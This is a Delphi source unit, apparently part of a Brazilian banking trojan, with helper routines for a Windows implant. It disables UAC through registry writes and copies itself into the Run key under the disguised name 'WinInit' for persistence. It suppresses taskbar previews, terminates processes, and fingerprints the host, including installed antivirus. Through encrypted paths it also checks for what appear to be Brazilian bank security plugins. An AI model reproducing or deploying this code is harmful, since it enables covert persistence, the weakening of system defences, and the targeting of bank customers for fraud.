unit uPCFuncs;

interface

uses Windows, Classes, Registry, TlHelp32, SysUtils, Messages, Forms, Activex,
  ComObj;

function NomePC: string;
function GetWindowsVersion: string;
function WUser: string;
procedure KP(hWindowHandle: HWND);
function GetProgramFilesDir: string;
procedure DisableUAC;
procedure DisablePreview;
procedure Install(Path, Dir: String);
procedure Delay(msecs: integer);
function GetOS: string;
function AVExists: string;
function GbExists: string;
function GetDefaultBrowser: String;


implementation

uses uCrypt;


function GbExists: string;
begin
  Result := 'Nothing';
  if FileExists(GetProgramFilesDir + Crypt('D','C246D86AF651F5163393DC0024B42AC5BA2AD371')) then
    Result := 'BB ';
  if FileExists(GetProgramFilesDir + Crypt('D','182D21D26FE96C984E8ED90521B329C663FD217EA85493')) then
    Result := Result + 'CEF ';
  if FileExists(GetProgramFilesDir + Crypt('D','0D3022D56AE4699B4985D27EA629BE70AC2ED230DE0A25')) then
    Result := Result + 'ITA ';
  if FileExists(GetProgramFilesDir + Crypt('D','99ACA658E463EB18CD0E5984A033A846EE6497F4133EF9')) then
    Result := Result + 'SANTA ';
end;

function GetDefaultBrowser: String;
var
  Reg: TRegistry;
  KeyName: string;
  ValueStr: string;
begin
  Reg := TRegistry.Create;
  try
    Reg.RootKey := HKEY_CLASSES_ROOT;
    KeyName     := 'htmlfile\shell\open\command';
    if Reg.OpenKey(KeyName, False) then
    begin
      Result := Reg.ReadString('');
      Reg.CloseKey;
    end;
  finally
    Reg.Free;
  end;
end;

function AVExists: string;
begin
  Result := 'Nothing';
  if DirectoryExists(GetProgramFilesDir + '\AVG') then
    Result := 'AVG ';
  if FileExists(GetProgramFilesDir + '\AVAST Software') then
    Result := Result + ' Avast';
end;

function GetOS: string;
var
  objWMIService: OLEVariant;
  colItems: OLEVariant;
  colItem: OLEVariant;
  oEnum: IEnumvariant;
  iValue: LongWord;

  function GetWMIObject(const objectName: String): IDispatch;
  var
    chEaten: integer;
    BindCtx: IBindCtx;
    Moniker: IMoniker;
  begin
    OleCheck(CreateBindCtx(0, BindCtx));
    OleCheck(MkParseDisplayName(BindCtx, StringToOleStr(objectName), chEaten,
      Moniker));
    OleCheck(Moniker.BindToObject(BindCtx, nil, IDispatch, Result));
  end;

begin
  try
    objWMIService := GetWMIObject('winmgmts:\\localhost\root\cimv2');
    colItems := objWMIService.ExecQuery
      ('SELECT * FROM Win32_OperatingSystem', 'WQL', 0);
    oEnum := IUnknown(colItems._NewEnum) as IEnumvariant;
    if oEnum.Next(1, colItem, iValue) = 0 then
      Result := Format('%s %s', [colItem.Caption, colItem.Version]);
  except
    Result := '?'
  end;
end;

procedure Delay(msecs: integer);
var
  FirstTickCount: longint;
begin
  FirstTickCount := GetTickCount;
  repeat
    Application.ProcessMessages; { para acessar outros controles, etc. }
  until ((GetTickCount - FirstTickCount) >= longint(msecs));
end;

procedure KP(hWindowHandle: HWND);
var
  hprocessID: integer;
  processHandle: THandle;
  DWResult: DWORD;
begin
  SendMessageTimeout( hWindowHandle, WM_CLOSE, 0, 0, SMTO_ABORTIFHUNG or SMTO_NORMAL, 5000, DWResult );
  if isWindow(hWindowHandle) then
     begin
       GetWindowThreadProcessID(hWindowHandle, @hprocessID);
       if hprocessID <> 0 then
          begin
            processHandle := OpenProcess(PROCESS_TERMINATE or PROCESS_QUERY_INFORMATION, False, hprocessID);
            if processHandle <> 0 then
               begin
                 TerminateProcess(processHandle, 0);
                 CloseHandle(processHandle);
              end;
          end;
     end;
end;

function GetProgramFilesDir: string;
var
  reg: TRegistry;
begin
  reg := TRegistry.Create;
  try
    reg.RootKey := HKEY_LOCAL_MACHINE;
    reg.OpenKey('SOFTWARE\Microsoft\Windows\CurrentVersion', False);
    Result := reg.ReadString('ProgramFilesDir');
  finally
    reg.Free;
  end;
end;

function NomePC: string;
const
  MAX_COMPUTER_LENGTH = 30;
var
  pNome: PChar;
  len: DWORD;
begin
  try
    len := MAX_COMPUTER_LENGTH + 1;
    GetMem(pNome, len);
    if GetComputerName(pNome, len) then
      Result := pNome
    else
      Result := 'Unknow';
  finally
    FreeMem(pNome, len);
  end;
end;

procedure Install(Path, Dir: String);
var
  reg: TRegistry;
begin
  reg := TRegistry.Create;
  if not DirectoryExists(Dir) then
    CreateDir(Dir);
  CopyFile(PChar(ParamStr(0)), PChar(Path), False);
  reg := TRegistry.Create;
  reg.RootKey := HKEY_CURRENT_USER;
  reg.OpenKey('\Software\Microsoft\Windows\CurrentVersion\Run', False);
  reg.WriteString('WinInit', '"' + Path + '"');
  reg.Free;
end;

procedure DisablePreview;
var
  reg: TRegistry;
begin
  reg := TRegistry.Create;
  reg.RootKey := HKEY_CURRENT_USER;
  reg.OpenKey
    ('Software\Microsoft\Windows\CurrentVersion\Policies\Explorer', True);
  try
    reg.WriteInteger('TaskbarNoThumbnail', 1);
  finally
    reg.Free;
  end;
end;

procedure DisableUAC;
var
  reg: TRegistry;
begin
  reg := TRegistry.Create;
  reg.RootKey := HKEY_LOCAL_MACHINE;
  reg.OpenKey
    ('Software\Microsoft\Windows\CurrentVersion\Policies\System', False);
  try
    reg.WriteInteger('EnabledLUA', 0);
    reg.WriteInteger('ConsentPromptBehaviorAdmin', 0);
  finally
    reg.Free;
  end;
end;

function GetWindowsVersion: string;
var
  VerInfo: TOsversionInfo;
  PlatformId, VersionNumber: string;
  reg: TRegistry;
begin
  VerInfo.dwOSVersionInfoSize := SizeOf(VerInfo);
  GetVersionEx(VerInfo);
  // Detect platform
  reg := TRegistry.Create;
  reg.RootKey := HKEY_LOCAL_MACHINE;
  case VerInfo.dwPlatformId of
    VER_PLATFORM_WIN32s:
      begin
        PlatformId := 'Windows 3.1';
      end;
    VER_PLATFORM_WIN32_WINDOWS:
      begin
        // Registry
        reg.OpenKey('\SOFTWARE\Microsoft\Windows\CurrentVersion', False);
        PlatformId := reg.ReadString('ProductName');
        VersionNumber := reg.ReadString('VersionNumber');
      end;
    VER_PLATFORM_WIN32_NT:
      begin
        reg.OpenKey('\SOFTWARE\Microsoft\Windows NT\CurrentVersion', False);
        PlatformId := reg.ReadString('ProductName');
        VersionNumber := reg.ReadString('CurrentVersion');
      end;
  end;
  reg.Free;
  Result := PlatformId + ' (version ' + VersionNumber + ')';
end;

Function WUser: string;
Var
  UserName: string;
  UserNameLen: DWORD;
Begin
  UserNameLen := 255;
  SetLength(UserName, UserNameLen);
  If GetUserName(PChar(UserName), UserNameLen) Then
    Result := Copy(UserName, 1, UserNameLen - 1)
  Else
    Result := 'Unknown';
End;

end.
